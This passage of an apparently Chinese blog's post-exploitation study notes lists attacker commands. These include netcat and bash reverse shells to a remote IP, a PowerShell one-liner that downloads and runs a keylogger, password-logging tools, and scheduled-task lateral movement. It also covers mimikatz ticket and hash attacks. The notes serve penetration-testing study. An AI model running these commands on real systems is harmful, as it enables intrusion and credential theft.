class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查找有suid位或sgid位的程序</span></span><br><span class=\"line\"><span class=\"builtin-name\">find</span> / -perm <span class=\"attribute\">-g</span>=s -o -perm <span class=\"attribute\">-u</span>=s -type f 2 &gt;/dev/<span class=\"literal\">null</span></span><br><span class=\"line\">查找能写或进入的目录</span><br><span class=\"line\"><span class=\"builtin-name\">find</span> / -writable -type d 2&gt;/dev/<span class=\"literal\">null</span></span><br><span class=\"line\"><span class=\"builtin-name\">find</span> / -perm -o+w -type d 2&gt;/dev/<span class=\"literal\">null</span></span><br><span class=\"line\"><span class=\"builtin-name\">find</span> / -perm -o+x -type d 2&gt;/dev/<span class=\"literal\">null</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>主动扫描</span><br><span class=\"line\">nmap,netdiscover,ping等</span><br><span class=\"line\"><span class=\"number\">2.</span>被动嗅探本机流量(arp,smb,netbios)等</span><br><span class=\"line\"><span class=\"number\">3.</span>本机残留信息</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"端口转发\"><a href=\"#端口转发\" class=\"headerlink\" title=\"端口转发\"></a>端口转发</h2><h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>在数据包用过网关(路由或防火墙)时,可将通信请求从一个地址和端口号组合重定向到另一个地址.</p>\n<h3 id=\"端口转发类型\"><a href=\"#端口转发类型\" class=\"headerlink\" title=\"端口转发类型\"></a>端口转发类型</h3><p>●本地端口转发</p>\n<p>●远程端口转发</p>\n<p>●动态端口转发</p>\n<h3 id=\"Windows下跨边界应用\"><a href=\"#Windows下跨边界应用\" class=\"headerlink\" title=\"Windows下跨边界应用\"></a>Windows下跨边界应用</h3><h4 id=\"Htran\"><a href=\"#Htran\" class=\"headerlink\" title=\"Htran\"></a>Htran</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#正向端口转发</span><br><span class=\"line\">\t服务端 <span class=\"selector-tag\">htran</span><span class=\"selector-class\">.exe</span> <span class=\"selector-tag\">-tran</span> 8888 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.1</span><span class=\"selector-class\">.1</span> 3389</span><br><span class=\"line\">\t客户端 <span class=\"selector-tag\">nc</span> 服务端<span class=\"selector-tag\">IP</span><span class=\"selector-pseudo\">:8888</span></span><br><span class=\"line\">#反向端口转发</span><br><span class=\"line\">\t攻击机 <span class=\"selector-tag\">htran</span><span class=\"selector-class\">.exe</span> <span class=\"selector-tag\">-listen</span> 1234 8888</span><br><span class=\"line\">\t服务端 <span class=\"selector-tag\">htran</span><span class=\"selector-class\">.exe</span> <span class=\"selector-tag\">-slave</span> 攻击<span class=\"selector-tag\">IP</span> 1234 127<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span> 3389</span><br><span class=\"line\">\t客户机 <span class=\"selector-tag\">nc</span> 127<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span><span class=\"selector-pseudo\">:8888</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Lcx\"><a href=\"#Lcx\" class=\"headerlink\" title=\"Lcx\"></a>Lcx</h4><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#监听<span class=\"number\">1234</span>,转发到<span class=\"number\">2333</span>端口</span><br><span class=\"line\">lcx.exe -<span class=\"section\">listen</span> <span class=\"number\">1234</span> <span class=\"number\">2333</span></span><br><span class=\"line\">#将目标<span class=\"number\">3389</span>转发到本地<span class=\"number\">1234</span></span><br><span class=\"line\">lcx.exe -slave ip <span class=\"number\">1234</span> <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span> <span class=\"number\">3389</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Netsh\"><a href=\"#Netsh\" class=\"headerlink\" title=\"Netsh\"></a>Netsh</h4><h4 id=\"Fpipe\"><a href=\"#Fpipe\" class=\"headerlink\" title=\"Fpipe\"></a>Fpipe</h4><h4 id=\"Socks代理\"><a href=\"#Socks代理\" class=\"headerlink\" title=\"Socks代理\"></a>Socks代理</h4><h5 id=\"reGeorg\"><a href=\"#reGeorg\" class=\"headerlink\" title=\"reGeorg\"></a>reGeorg</h5><h5 id=\"ssocks\"><a href=\"#ssocks\" class=\"headerlink\" title=\"ssocks\"></a>ssocks</h5><h3 id=\"Linux下跨边界应用\"><a href=\"#Linux下跨边界应用\" class=\"headerlink\" title=\"Linux下跨边界应用\"></a>Linux下跨边界应用</h3><h4 id=\"rtcp-py\"><a href=\"#rtcp-py\" class=\"headerlink\" title=\"rtcp.py\"></a>rtcp.py</h4><p><a href=\"https://github.com/knownsec/rtcp\" target=\"_blank\" rel=\"noopener\">https://github.com/knownsec/rtcp</a></p>\n<h4 id=\"SSH-PUTTY\"><a href=\"#SSH-PUTTY\" class=\"headerlink\" title=\"SSH + PUTTY\"></a>SSH + PUTTY</h4><h4 id=\"netcat与socat端口转发\"><a href=\"#netcat与socat端口转发\" class=\"headerlink\" title=\"netcat与socat端口转发\"></a>netcat与socat端口转发</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netcat:</span><br><span class=\"line\">转发本地8888端口到192.168.1.1的80端口</span><br><span class=\"line\">mkfifo p</span><br><span class=\"line\">cat p | nc 192.168.17.143 80 | nc -l 8888 &gt; p</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">socat:</span><br><span class=\"line\">转发本地的1080端口到远程的8080端口(守护进程)</span><br><span class=\"line\">Nohup socat TCP4-LISTEN:1080,reuseaddr,fork</span><br><span class=\"line\">TCP4:192.168.1.1:8080</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Earthworm-跨平台内网穿透\"><a href=\"#Earthworm-跨平台内网穿透\" class=\"headerlink\" title=\"Earthworm:跨平台内网穿透\"></a>Earthworm:跨平台内网穿透</h3><h3 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h3><h4 id=\"Netcat\"><a href=\"#Netcat\" class=\"headerlink\" title=\"Netcat\"></a>Netcat</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">操作机</span></span><br><span class=\"line\">nc.exe -nvv -lp 4444</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">Windiw</span></span><br><span class=\"line\">nc.exe -e cmd IP 4444</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">Linux</span></span><br><span class=\"line\">nc -e /bin/bash IP 4444</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Bash\"><a href=\"#Bash\" class=\"headerlink\" title=\"Bash\"></a>Bash</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"python-Perl-Php反弹\"><a href=\"#python-Perl-Php反弹\" class=\"headerlink\" title=\"python/Perl/Php反弹\"></a>python/Perl/Php反弹</h4><h2 id=\"密码记录与欺骗攻击\"><a href=\"#密码记录与欺骗攻击\" class=\"headerlink\" title=\"密码记录与欺骗攻击\"></a>密码记录与欺骗攻击</h2><h3 id=\"密码记录工具\"><a href=\"#密码记录工具\" class=\"headerlink\" title=\"密码记录工具\"></a>密码记录工具</h3><h4 id=\"Winlogonhack\"><a href=\"#Winlogonhack\" class=\"headerlink\" title=\"Winlogonhack\"></a>Winlogonhack</h4><p>通过hook相关函数来记录登录密码</p>\n<h4 id=\"Ntpass\"><a href=\"#Ntpass\" class=\"headerlink\" title=\"Ntpass\"></a>Ntpass</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">安装:\trundll32 NTPass.dll,Install</span><br><span class=\"line\">移除: rundll32 NTPass.dll,Remove</span><br><span class=\"line\">口令保存位置: %systemroot%\\system32\\eulagold.txt</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Get-Keystrokes-ps1\"><a href=\"#Get-Keystrokes-ps1\" class=\"headerlink\" title=\"Get-Keystrokes.ps1\"></a>Get-Keystrokes.ps1</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-Keystrokes.ps1’); Get-Keystrokes –Logpath C:\\log.txt</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Invoke-CredentialsPhish-ps1\"><a href=\"#Invoke-CredentialsPhish-ps1\" class=\"headerlink\" title=\"Invoke-CredentialsPhish.ps1\"></a>Invoke-CredentialsPhish.ps1</h4><p><a href=\"https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1\" target=\"_blank\" rel=\"noopener\">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1</a></p>\n<h4 id=\"Openssh后门\"><a href=\"#Openssh后门\" class=\"headerlink\" title=\"Openssh后门\"></a>Openssh后门</h4><p>概念:OpenSSH是SSH协议的免费开源实现.</p>\n<h4 id=\"Openssh-backdoor-kit\"><a href=\"#Openssh-backdoor-kit\" class=\"headerlink\" title=\"Openssh-backdoor-kit\"></a>Openssh-backdoor-kit</h4><p><a href=\"https://github.com/jivoi/openssh-backdoor-kit\" target=\"_blank\" rel=\"noopener\">https://github.com/jivoi/openssh-backdoor-kit</a></p>\n<p>留后门</p>\n<h4 id=\"linux键盘记录sh2log\"><a href=\"#linux键盘记录sh2log\" class=\"headerlink\" title=\"linux键盘记录sh2log\"></a>linux键盘记录sh2log</h4><h3 id=\"ARP与DNS欺骗攻击\"><a href=\"#ARP与DNS欺骗攻击\" class=\"headerlink\" title=\"ARP与DNS欺骗攻击\"></a>ARP与DNS欺骗攻击</h3><h4 id=\"arp欺骗攻击\"><a href=\"#arp欺骗攻击\" class=\"headerlink\" title=\"arp欺骗攻击\"></a>arp欺骗攻击</h4><h5 id=\"Cain\"><a href=\"#Cain\" class=\"headerlink\" title=\"Cain\"></a>Cain</h5><h5 id=\"Abel\"><a href=\"#Abel\" class=\"headerlink\" title=\"Abel\"></a>Abel</h5><h4 id=\"DNS欺骗攻击\"><a href=\"#DNS欺骗攻击\" class=\"headerlink\" title=\"DNS欺骗攻击\"></a>DNS欺骗攻击</h4><h2 id=\"横向移动\"><a href=\"#横向移动\" class=\"headerlink\" title=\"横向移动\"></a>横向移动</h2><h4 id=\"SMB协议利用\"><a href=\"#SMB协议利用\" class=\"headerlink\" title=\"SMB协议利用\"></a>SMB协议利用</h4><p>SMB(服务器消息块)网络文件共享系统</p>\n<p>msf扫描:    auxiliary/scanner/smb/smb_login</p>\n<h5 id=\"MS17-010\"><a href=\"#MS17-010\" class=\"headerlink\" title=\"MS17-010\"></a>MS17-010</h5><h4 id=\"跨平台横向移动-wmi利用\"><a href=\"#跨平台横向移动-wmi利用\" class=\"headerlink\" title=\"跨平台横向移动 [ wmi利用 ]\"></a>跨平台横向移动 [ wmi利用 ]</h4><p><a href=\"https://mp.weixin.qq.com/s/7YidkhJvmVBxFhYcD7pIfQ\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/7YidkhJvmVBxFhYcD7pIfQ</a></p>\n<ul>\n<li>wmi是什么 ?</li>\n<li>想成功利用wmi进行横向移动的前提条件又是什么 ?</li>\n<li>如何利用win自带的wmic工具纯手工对目标windows机器进行各种远程操作</li>\n<li>关于wmi在powershell下的一些常规应用</li>\n<li>如何借助各种外部wmi工具更方便的实现远程执行及半交互式shell获取</li>\n<li>基于wmi的跨平台横向移动</li>\n<li>关于CobaltStrike以及msf自带的wmi横向功能模块利用</li>\n</ul>\n<h4 id=\"计划任务利用\"><a href=\"#计划任务利用\" class=\"headerlink\" title=\"计划任务利用\"></a>计划任务利用</h4><h5 id=\"ipc\"><a href=\"#ipc\" class=\"headerlink\" title=\"ipc\"></a>ipc</h5><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use <span class=\"symbol\">\\\\</span>192.168.111.201<span class=\"symbol\">\\I</span>PC$ /user:\"administrator\" \"admin\"</span><br><span class=\"line\">copy C:<span class=\"symbol\">\\U</span>sers<span class=\"symbol\">\\g</span>uanxingzhou<span class=\"symbol\">\\D</span>esktop<span class=\"symbol\">\\p</span>utty.exe <span class=\"symbol\">\\\\</span>192.168.111.201<span class=\"symbol\">\\c</span>$</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"schtasks\"><a href=\"#schtasks\" class=\"headerlink\" title=\"schtasks\"></a>schtasks</h5><figure class=\"highlight jboss-cli\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks <span class=\"string\">/create</span> <span class=\"string\">/s</span> 192.168.0.70 <span class=\"string\">/u</span> Administrator <span class=\"string\">/p</span> admin <span class=\"string\">/ru</span> <span class=\"string\">\"SYSTEM\"</span> <span class=\"string\">/tn</span> CMDNAME <span class=\"string\">/sc</span> DAILY <span class=\"string\">/st</span> 22<span class=\"function\">:18</span> <span class=\"string\">/tr</span> C:\\\\Users\\\\college\\\\Desktop\\\\sha\\\\cmd.bat <span class=\"string\">/F</span></span><br><span class=\"line\">at</span><br><span class=\"line\">at \\\\192.168.3.102 19<span class=\"function\">:30</span> <span class=\"string\">/every</span><span class=\"function\">:5</span>,6,7,10,18,19,21,24,28 c:\\windows\\temp\\cmd.bat</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"at\"><a href=\"#at\" class=\"headerlink\" title=\"at\"></a>at</h5><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">at <span class=\"symbol\">\\\\</span>192.168.3.102 19:30 /every:5,6,7,10,18,19,21,24,28 c:<span class=\"symbol\">\\w</span>indows<span class=\"symbol\">\\t</span>emp<span class=\"symbol\">\\c</span>md.bat</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"域内信息收集\"><a href=\"#域内信息收集\" class=\"headerlink\" title=\"域内信息收集\"></a>域内信息收集</h2><h3 id=\"Windows认证\"><a href=\"#Windows认证\" class=\"headerlink\" title=\"Windows认证\"></a>Windows认证</h3><h4 id=\"NTLM认证过程\"><a href=\"#NTLM认证过程\" class=\"headerlink\" title=\"NTLM认证过程\"></a>NTLM认证过程</h4><h4 id=\"Kerberos认证过程\"><a href=\"#Kerberos认证过程\" class=\"headerlink\" title=\"Kerberos认证过程\"></a>Kerberos认证过程</h4><h3 id=\"域用户消息\"><a href=\"#域用户消息\" class=\"headerlink\" title=\"域用户消息\"></a>域用户消息</h3><figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查看当前用户及sid</span></span><br><span class=\"line\">whoami /user</span><br><span class=\"line\"><span class=\"comment\">#查看用户组</span></span><br><span class=\"line\">whoami /proups</span><br><span class=\"line\"><span class=\"comment\">#查看用户权限</span></span><br><span class=\"line\">whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看域中用户组</span></span><br><span class=\"line\">net group /domain </span><br><span class=\"line\"><span class=\"comment\">#获得域管理员</span></span><br><span class=\"line\">net group <span class=\"string\">\"domain admins\"</span> /domain</span><br><span class=\"line\"><span class=\"comment\">#获得域控制器列表</span></span><br><span class=\"line\">net group <span class=\"string\">\"domain controllers\"</span> /domain</span><br><span class=\"line\"><span class=\"comment\">#获得域成员计算机列表</span></span><br><span class=\"line\">net group <span class=\"string\">\"domain computers\"</span> /domain</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看域中用户</span></span><br><span class=\"line\">net user /domain</span><br><span class=\"line\"><span class=\"comment\">#获得域密码策略设置,密码长短等</span></span><br><span class=\"line\">net accounts /domain</span><br><span class=\"line\"><span class=\"comment\">#列出或断开本机和连接的客户端会话</span></span><br><span class=\"line\">net session</span><br><span class=\"line\"><span class=\"comment\">#查询时间,可用来定位域控</span></span><br><span class=\"line\">net time /domain</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看所有域或工作组</span></span><br><span class=\"line\">net view /domain</span><br><span class=\"line\"><span class=\"comment\">#查看域或工作组下所有在线机器</span></span><br><span class=\"line\">net view /domain:&#123;name&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看共享</span></span><br><span class=\"line\">net share</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"SRV\"><a href=\"#SRV\" class=\"headerlink\" title=\"SRV\"></a>SRV</h4><p>SRV是DNS中的一种资源记录,将服务名称映射到提供DNS服务的计算机名.</p>\n<p>利用Nslookup查询SRV</p>\n<figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nslookup</span><br><span class=\"line\"><span class=\"built_in\">set</span> <span class=\"built_in\">type</span>=all</span><br><span class=\"line\"><span class=\"variable\">_ldap</span>.<span class=\"variable\">_tcp</span>.dc.<span class=\"variable\">_msdcs</span>.college.com</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"SPN\"><a href=\"#SPN\" class=\"headerlink\" title=\"SPN\"></a>SPN</h4><p>服务主体名称,作用是对服务进行唯一标识.</p>\n<h5 id=\"Setspn-exe\"><a href=\"#Setspn-exe\" class=\"headerlink\" title=\"Setspn.exe\"></a>Setspn.exe</h5><p>spn命令行软件</p>\n<h4 id=\"ADFind-exe\"><a href=\"#ADFind-exe\" class=\"headerlink\" title=\"ADFind.exe\"></a>ADFind.exe</h4><p>活动目录查询工具</p>\n<p>官方文档:</p>\n<p><a href=\"http://www.joeware.net/freetools/tools/adfind/usage.htm\" target=\"_blank\" rel=\"noopener\">http://www.joeware.net/freetools/tools/adfind/usage.htm</a></p>\n<h4 id=\"PVEFindADUser-exe\"><a href=\"#PVEFindADUser-exe\" class=\"headerlink\" title=\"PVEFindADUser.exe\"></a>PVEFindADUser.exe</h4><p>项目地址:</p>\n<p><a href=\"https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn\" target=\"_blank\" rel=\"noopener\">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#显示每台计算机上登录用户</span></span><br><span class=\"line\">PVEFindaduser -current -noping</span><br><span class=\"line\"><span class=\"comment\">#查看172.17.0.132主机上登录的用户</span></span><br><span class=\"line\">PVEFindaduser -current -target <span class=\"number\">172.17</span>.<span class=\"number\">0.132</span></span><br><span class=\"line\"><span class=\"comment\">#查看每台计算机上传登录的用户</span></span><br><span class=\"line\">PVEFindaduser -last</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"NetView-exe\"><a href=\"#NetView-exe\" class=\"headerlink\" title=\"NetView.exe\"></a>NetView.exe</h4><p>收集域内主机共享,ip,是否域控等信息</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#将主机名(或IP地址)列表保存在文件host.txt中</span></span><br><span class=\"line\">netview -f host.txt</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Netsess-exe\"><a href=\"#Netsess-exe\" class=\"headerlink\" title=\"Netsess.exe\"></a>Netsess.exe</h4><p>列举目标主机上的NetBIOS session</p>\n<h4 id=\"Nltest-exe\"><a href=\"#Nltest-exe\" class=\"headerlink\" title=\"Nltest.exe\"></a>Nltest.exe</h4><p>测试域间信任关系</p>\n<p>CSVDE&amp;LDIFDE</p>\n<p>从ad ds中导入/导出数据.</p>\n<p>CSVDE -&gt; csv</p>\n<p>LDIFDE -&gt; ldif</p>\n<h4 id=\"ADExplorer-exe\"><a href=\"#ADExplorer-exe\" class=\"headerlink\" title=\"ADExplorer.exe\"></a>ADExplorer.exe</h4><p>查看域结构</p>\n<h4 id=\"LASPSearch\"><a href=\"#LASPSearch\" class=\"headerlink\" title=\"LASPSearch\"></a>LASPSearch</h4><p>Ldapsearch是linux下ldap客户端</p>\n<h4 id=\"离线凭证收集-1\"><a href=\"#离线凭证收集-1\" class=\"headerlink\" title=\"离线凭证收集\"></a>离线凭证收集</h4><p>域用户hash位置:域控上%WINDIR%\\ntds\\ntds.dit</p>\n<ol>\n<li><p>ntdsuti提取ntds.dit</p>\n</li>\n<li><p>使用ntdsdumpex</p>\n</li>\n</ol>\n<h4 id=\"Powershell利用\"><a href=\"#Powershell利用\" class=\"headerlink\" title=\"Powershell利用\"></a>Powershell利用</h4><h5 id=\"PowerSploit\"><a href=\"#PowerSploit\" class=\"headerlink\" title=\"PowerSploit\"></a>PowerSploit</h5><p>powershell渗透框架<br><a href=\"https://github.com/PowerShellMafia/PowerSploit\" target=\"_blank\" rel=\"noopener\">https://github.com/PowerShellMafia/PowerSploit</a></p>\n<h5 id=\"PowerView\"><a href=\"#PowerView\" class=\"headerlink\" title=\"PowerView\"></a>PowerView</h5><p><a href=\"https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon\" target=\"_blank\" rel=\"noopener\">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p>\n<h2 id=\"域内横向移动\"><a href=\"#域内横向移动\" class=\"headerlink\" title=\"域内横向移动\"></a>域内横向移动</h2><h3 id=\"横向拓展常见漏洞\"><a href=\"#横向拓展常见漏洞\" class=\"headerlink\" title=\"横向拓展常见漏洞\"></a>横向拓展常见漏洞</h3><h4 id=\"MS14-068\"><a href=\"#MS14-068\" class=\"headerlink\" title=\"MS14-068\"></a>MS14-068</h4><p>MS14-068可以使任意一个普通域用户提升至域管理员权限</p>\n<p>利用工具:<a href=\"https://github.com/gentilkiwi/kekeo\" target=\"_blank\" rel=\"noopener\">https://github.com/gentilkiwi/kekeo</a></p>\n<h4 id=\"GPP漏洞\"><a href=\"#GPP漏洞\" class=\"headerlink\" title=\"GPP漏洞\"></a>GPP漏洞</h4><p>组策略对象:组策略容器(GPC)和组策略模板(GPT)</p>\n<p>组策略模板位置:%systemroot%\\sysvol\\domainname\\Policies{GUID}</p>\n<p>当管理员使用(为所有域成员主机添加本地用户)的组策略首选项后,域成员会下载groups.xml文件,里面有新建用户信息,可解密.</p>\n<p>利用工具:Get-GPPPassword.</p>\n<h4 id=\"SPN票据破解\"><a href=\"#SPN票据破解\" class=\"headerlink\" title=\"SPN票据破解\"></a>SPN票据破解</h4><p>破解方法</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RC4加密方式使用tgsrepcrack.py</span><br><span class=\"line\">AES加密方式通过kirbi2john转换为hash,通过john/hashcat破解</span><br></pre></td></tr></table></figure>\n\n<p>SPN扫描</p>\n<p>获取破解SPN票据</p>\n<p>使用字典进行破解</p>\n<h4 id=\"Mimikatz后渗透中应用\"><a href=\"#Mimikatz后渗透中应用\" class=\"headerlink\" title=\"Mimikatz后渗透中应用\"></a>Mimikatz后渗透中应用</h4><h5 id=\"Pass-The-Hash\"><a href=\"#Pass-The-Hash\" class=\"headerlink\" title=\"Pass-The-Hash\"></a>Pass-The-Hash</h5><ol>\n<li><p>了解NTLM认证过程</p>\n</li>\n<li><p>使用mimikatz进行hash传递攻击过程</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.本机抓取密码hash</span><br><span class=\"line\">2.使用mimikatz中的sekurlsa::pth命令</span><br><span class=\"line\">3.弹出cmd.尝试查看目标共享</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<h5 id=\"Pass-The-Ticket\"><a href=\"#Pass-The-Ticket\" class=\"headerlink\" title=\"Pass-The-Ticket\"></a>Pass-The-Ticket</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">查看当前用户的ticket</span></span><br><span class=\"line\">Kerberos::list</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">导出当前用户ticket</span></span><br><span class=\"line\">Kerberos::list /export</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">查看所有ticket</span></span><br><span class=\"line\">Sekurlsa::tickets</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">导出所有ticket</span></span><br><span class=\"line\">Sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>\n\n<p>将获取的票据在其他机器导入</p>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Kerberos::ptt 票据名</span><br><span class=\"line\">导入票据后用<span class=\"symbol\">:Dir</span>\\\\DC\\c<span class=\"variable\">$ </span>测试</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"Pass-The-Cache\"><a href=\"#Pass-The-Cache\" class=\"headerlink\" title=\"Pass-The-Cache\"></a>Pass-The-Cache</h5><p>获取缓存目录的票据</p>\n<h4 id=\"Golden-Ticket\"><a href=\"#Golden-Ticket\" class=\"headerlink\" title=\"Golden Ticket\"></a>Golden Ticket</h4><p>能为任意用户生成TGT票据</p>\n<p>条件:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 域sid</span><br><span class=\"line\">2. 域名</span><br><span class=\"line\">3. 域账户</span><br><span class=\"line\"></span><br><span class=\"line\">利用上面信息用 mimikatz的kerberos::golden命令生成黄金票据</span><br><span class=\"line\">导入票据</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Silver-Ticket\"><a href=\"#Silver-Ticket\" class=\"headerlink\" title=\"Silver Ticket\"></a>Silver Ticket</h4><p>伪装ST</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span 